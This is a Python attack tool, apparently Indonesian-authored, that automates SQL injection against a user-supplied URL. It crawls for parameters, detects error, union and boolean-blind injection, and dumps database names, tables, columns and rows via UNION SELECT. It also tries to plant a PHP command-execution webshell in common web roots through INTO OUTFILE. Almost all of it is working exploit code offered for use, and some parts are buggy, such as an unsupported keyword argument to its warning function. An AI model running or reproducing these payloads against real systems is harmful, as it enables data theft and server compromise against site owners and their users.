#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# MAI - SQL Injection Auto Exploitation Framework
# Author: fanky
# Version: 3.0 (2026)
# Credits: sqlmap, muani, psql-pro
# Description: Fully automated SQL injection scanner with parameter discovery,
#              union-based extraction, boolean blind, and webshell upload.

import sys
import re
import time
import random
import string
import urllib.parse
import urllib.robotparser
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import OrderedDict

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ------------------------- CONFIGURATION -------------------------
TIMEOUT = 15
DELAY = 0.3
MAX_THREADS = 5
MAX_COLUMNS = 30
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
]

COLORS = {
    'INFO': '\033[92m',      # green
    'ERROR': '\033[91m',     # red
    'SUCCESS': '\033[94m',   # blue
    'WARNING': '\033[93m',   # yellow
    'DEBUG': '\033[96m',     # cyan
    'RESET': '\033[0m',
    'BOLD': '\033[1m'
}

# ------------------------- OUTPUT HELPERS -------------------------
def print_info(msg):
    print(f"{COLORS['INFO']}[INFO]{COLORS['RESET']} {msg}")

def print_error(msg):
    print(f"{COLORS['ERROR']}[ERROR]{COLORS['RESET']} {msg}")

def print_success(msg):
    print(f"{COLORS['SUCCESS']}[SUCCESS]{COLORS['RESET']} {msg}")

def print_warning(msg):
    print(f"{COLORS['WARNING']}[WARNING]{COLORS['RESET']} {msg}")

def print_debug(msg):
    print(f"{COLORS['DEBUG']}[DEBUG]{COLORS['RESET']} {msg}")

def print_banner():
    print(f"{COLORS['BOLD']}{COLORS['DEBUG']}")
    print("  ╔══════════════════════════════════════════════════════════════════╗")
    print("  ║            MAI - SQL Injection Auto Exploitation Suite           ║")
    print("  ║                         Author: fanky                            ║")
    print("  ║                      Professional Edition 2026                    ║")
    print("  ║          Features: Auto crawl | Union | Blind | Shell            ║")
    print("  ╚══════════════════════════════════════════════════════════════════╝")
    print(f"{COLORS['RESET']}")

# ------------------------- HTTP HELPERS -------------------------
class HttpSession:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.cookies = {}
    
    def get(self, url, params=None):
        time.sleep(DELAY)
        try:
            resp = self.session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
            resp.encoding = 'utf-8'
            return resp
        except Exception as e:
            print_debug(f"GET error {url}: {str(e)[:50]}")
            return None
    
    def post(self, url, data=None):
        time.sleep(DELAY)
        try:
            resp = self.session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
            resp.encoding = 'utf-8'
            return resp
        except Exception as e:
            print_debug(f"POST error {url}: {str(e)[:50]}")
            return None

http = HttpSession()

# ------------------------- HTML PARSER & CRAWLER -------------------------
class FormExtractor(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.forms = []        # list of (action_url, method, inputs)
        self.links = []        # list of absolute urls
        self.scripts = []
    
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'a' and 'href' in attrs:
            href = attrs['href']
            if '?' in href:
                full = urllib.parse.urljoin(self.base_url, href)
                self.links.append(full)
        elif tag == 'form':
            action = attrs.get('action', '')
            method = attrs.get('method', 'get').lower()
            full_action = urllib.parse.urljoin(self.base_url, action)
            self.forms.append([full_action, method, []])
        elif tag == 'input' and self.forms:
            name = attrs.get('name')
            if name:
                self.forms[-1][2].append(name)
        elif tag == 'script' and 'src' in attrs:
            src = attrs['src']
            if src.endswith('.js'):
                full_js = urllib.parse.urljoin(self.base_url, src)
                self.scripts.append(full_js)

def extract_params_from_url(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    return {}

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')

def discover_endpoints(target):
    print_info(f"Crawling {target} untuk menemukan parameter dan form...")
    resp = http.get(target)
    if not resp or resp.status_code != 200:
        print_error("Gagal mengakses halaman utama")
        return [], []
    
    parser = FormExtractor(target)
    parser.feed(resp.text)
    
    unique_links = list(OrderedDict.fromkeys(parser.links))
    print_info(f"Ditemukan {len(unique_links)} URL dengan parameter GET")
    
    get_endpoints = []
    for link in unique_links:
        params = extract_params_from_url(link)
        if params:
            get_endpoints.append((link, params))
    
    post_forms = []
    for action, method, inputs in parser.forms:
        if method == 'post' and inputs:
            post_forms.append((action, inputs))
    
    print_info(f"Ditemukan {len(get_endpoints)} endpoint GET dan {len(post_forms)} form POST")
    return get_endpoints, post_forms

# ------------------------- INJECTION DETECTION -------------------------
def test_error_based(url, param, original_value, original_content):
    """Test single quote, double quote, and numeric injection"""
    test_payloads = [
        ("'", "string_quote"),
        ("\"", "string_double"),
        ("' OR '1'='1", "string_or"),
        (" AND 1=2", "numeric")
    ]
    for payload, ptype in test_payloads:
        test_val = f"{original_value}{payload}"
        params = {param: test_val}
        resp = http.get(url, params=params)
        if resp and resp.status_code == 200:
            # cek error sql
            error_patterns = [
                "mysql_fetch", "SQL syntax", "You have an error", 
                "Unclosed quotation mark", "Microsoft OLE DB", 
                "PostgreSQL", "ORA-", "SQLite"
            ]
            lower_content = resp.text.lower()
            if any(pattern.lower() in lower_content for pattern in error_patterns):
                print_success(f"Error based injection on {param} dengan payload {payload}")
                return "error", payload
            # cek perubahan konten
            if resp.text != original_content:
                print_success(f"Boolean/Union based injection on {param} dengan payload {payload}")
                return "union", payload
    return None, None

def detect_injection_type(url, param, original_value, original_content):
    # coba error based dulu
    inj_type, trigger = test_error_based(url, param, original_value, original_content)
    if inj_type:
        return inj_type, trigger
    
    # coba boolean blind
    print_debug(f"Mencoba boolean blind pada {param}")
    true_payload = f"{original_value}' AND '1'='1"
    false_payload = f"{original_value}' AND '1'='2"
    params_true = {param: true_payload}
    params_false = {param: false_payload}
    resp_true = http.get(url, params=params_true)
    resp_false = http.get(url, params=params_false)
    if resp_true and resp_false and resp_true.text != resp_false.text:
        print_success(f"Boolean blind injection pada {param}")
        return "boolean", "' AND '1'='1"
    
    return None, None

# ------------------------- COLUMN COUNTING -------------------------
def count_columns(url, param, original_value, inj_type, trigger):
    for cols in range(1, MAX_COLUMNS + 1):
        if inj_type == "error" or inj_type == "union":
            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
        elif inj_type == "boolean":
            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
        else:
            payload = f"{original_value}' ORDER BY {cols}-- -"
        params = {param: payload}
        resp = http.get(url, params=params)
        if not resp:
            continue
        if "Unknown column" in resp.text or "error" in resp.text.lower() or ("boolean" in inj_type and resp.text == None):
            print_info(f"Order by {cols} gagal -> kolom maksimal {cols-1}")
            return cols-1
    return MAX_COLUMNS

# ------------------------- UNION BASED EXPLOIT -------------------------
def union_extract(url, param, original_value, trigger, num_cols):
    print_info(f"Mencoba UNION extract dengan {num_cols} kolom")
    # cari posisi kolom yang tampil dengan marker
    markers = [str(i*11) for i in range(1, num_cols+1)]
    union_payload = f"{original_value}{trigger} UNION SELECT {','.join(markers)}-- -"
    params = {param: union_payload}
    resp = http.get(url, params=params)
    if resp and resp.status_code == 200:
        # cari marker di response
        found_markers = []
        for m in markers:
            if m in resp.text:
                found_markers.append(m)
        if found_markers:
            print_success(f"Kolom visible: {', '.join(found_markers)}")
            return resp.text
    return None

def dump_database_name(url, param, original_value, trigger, num_cols):
    # asumsikan posisi kolom pertama bisa tampil
    # kita inject database()
    query = f"{original_value}{trigger} UNION SELECT NULL,database(),NULL-- -"
    # kita perlu menyesuaikan jumlah NULL sesuai kolom
    null_list = ['NULL'] * num_cols
    null_list[1] = "database()"
    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)}-- -"
    params = {param: query}
    resp = http.get(url, params=params)
    if resp:
        # cari string yang menyerupai nama database (huruf/angka/_)
        match = re.search(r'([a-zA-Z0-9_\-]{3,30})', resp.text)
        if match:
            db = match.group(1)
            print_success(f"Database name: {db}")
            return db
    return None

def dump_tables(url, param, original_value, trigger, num_cols, db_name):
    print_info(f"Mencoba mengambil tabel dari database {db_name}")
    # information_schema.tables
    query = f"{original_value}{trigger} UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
    null_list = ['NULL'] * num_cols
    null_list[1] = "table_name"
    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
    params = {param: query}
    resp = http.get(url, params=params)
    if resp:
        tables = re.findall(r'([a-zA-Z0-9_]{2,30})', resp.text)
        if tables:
            unique_tables = list(OrderedDict.fromkeys(tables))
            print_success(f"Tables: {', '.join(unique_tables[:10])}")
            return unique_tables
    return []

def dump_columns(url, param, original_value, trigger, num_cols, db_name, table_name):
    query = f"{original_value}{trigger} UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
    null_list = ['NULL'] * num_cols
    null_list[1] = "column_name"
    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
    params = {param: query}
    resp = http.get(url, params=params)
    if resp:
        cols = re.findall(r'([a-zA-Z0-9_]{2,40})', resp.text)
        if cols:
            print_success(f"Columns in {table_name}: {', '.join(cols[:10])}")
            return cols
    return []

def dump_data(url, param, original_value, trigger, num_cols, db_name, table_name, column_name):
    print_info(f"Extracting data from {table_name}.{column_name} limit 10")
    query = f"{original_value}{trigger} UNION SELECT NULL,{column_name},NULL FROM {db_name}.{table_name} LIMIT 10-- -"
    null_list = ['NULL'] * num_cols
    null_list[1] = column_name
    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} FROM {db_name}.{table_name} LIMIT 10-- -"
    params = {param: query}
    resp = http.get(url, params=params)
    if resp:
        data = re.findall(r'>([^<]{4,100})<', resp.text)
        if data:
            for idx, val in enumerate(data[:10]):
                print_success(f"Row {idx+1}: {val}")
            return data
    return []

# ------------------------- WEBSHELL UPLOAD (INTO OUTFILE) -------------------------
def try_upload_shell(url, param, original_value, trigger, num_cols):
    print_info("Mencoba upload webshell via INTO OUTFILE...")
    shell_code = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
    # paths umum yang writable
    paths = [
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "/home/public_html/shell.php",
        "/tmp/shell.php",
        "C:/xampp/htdocs/shell.php",
        "C:/inetpub/wwwroot/shell.php"
    ]
    for path in paths:
        null_list = ['NULL'] * num_cols
        null_list[0] = f"'{shell_code}'"
        payload = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} INTO OUTFILE '{path}'-- -"
        params = {param: payload}
        resp = http.get(url, params=params)
        if resp and "error" not in resp.text.lower():
            print_success(f"Webshell uploaded to {path}")
            print_warning(f"Coba akses: {path}?cmd=id")
            return True
    print_error("Gagal upload shell (periksa file privileges)")
    return False

# ------------------------- MAIN SCANNER -------------------------
def scan_endpoint(url, params_dict):
    for param, original_value in params_dict.items():
        print_info(f"Testing parameter: {param} = {original_value}")
        orig_resp = http.get(url)
        if not orig_resp:
            continue
        original_content = orig_resp.text
        
        inj_type, trigger = detect_injection_type(url, param, original_value, original_content)
        if not inj_type:
            print_debug(f"Parameter {param} tidak rentan")
            continue
        
        print_success(f"VULNERABLE! {param} ({inj_type} based)")
        # hitung kolom
        num_cols = count_columns(url, param, original_value, inj_type, trigger)
        print_info(f"Jumlah kolom: {num_cols}")
        
        if inj_type in ["error", "union"]:
            # ekstrak union
            union_data = union_extract(url, param, original_value, trigger, num_cols)
            if union_data:
                # dump database
                db_name = dump_database_name(url, param, original_value, trigger, num_cols)
                if db_name:
                    tables = dump_tables(url, param, original_value, trigger, num_cols, db_name)
                    if tables and len(tables) > 0:
                        # ambil tabel pertama
                        first_table = tables[0]
                        columns = dump_columns(url, param, original_value, trigger, num_cols, db_name, first_table)
                        if columns:
                            first_col = columns[0]
                            dump_data(url, param, original_value, trigger, num_cols, db_name, first_table, first_col)
                # tanya upload shell
                print_warning("Upload webshell? (y/n): ", end='')
                choice = sys.stdin.readline().strip().lower()
                if choice == 'y':
                    try_upload_shell(url, param, original_value, trigger, num_cols)
        elif inj_type == "boolean":
            print_warning("Boolean blind ditemukan, butuh waktu lebih lama untuk ekstrak data")
            # di sini bisa implementasi boolean blind extraction, tapi skip dulu biar ga kepanjangan
        
        # setelah satu parameter rentan, kita lanjut ke endpoint lain (optional)
        break

def main():
    print_banner()
    target = input(f"{COLORS['BOLD']}{COLORS['WARNING']}Masukkan URL target > {COLORS['RESET']}").strip()
    if not target:
        print_error("URL tidak boleh kosong")
        sys.exit(1)
    target = normalize_url(target)
    
    # discover endpoints
    get_endpoints, post_forms = discover_endpoints(target)
    
    if not get_endpoints and not post_forms:
        print_error("Tidak ditemukan parameter GET atau form POST. Coba manual.")
        # fallback: cek apakah url sendiri punya param?
        params = extract_params_from_url(target)
        if params:
            get_endpoints = [(target, params)]
    
    total = len(get_endpoints) + len(post_forms)
    print_info(f"Memulai scan pada {total} endpoint")
    
    # scan GET endpoints dengan multi-threading
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(scan_endpoint, url, params) for url, params in get_endpoints]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print_debug(f"Thread error: {e}")
    
    # scan POST forms (sederhana: hanya coba beberapa field)
    for action, inputs in post_forms:
        print_info(f"Mencoba POST form: {action}")
        # buat data dummy dengan payload
        for inp in inputs[:3]:  # limit 3 field per form
            test_data = {inp: "'"}
            resp = http.post(action, data=test_data)
            if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
                print_success(f"POST injection pada field {inp} di {action}")
    
    print_success("Scan selesai.")

if __name__ == "__main__":
    main()
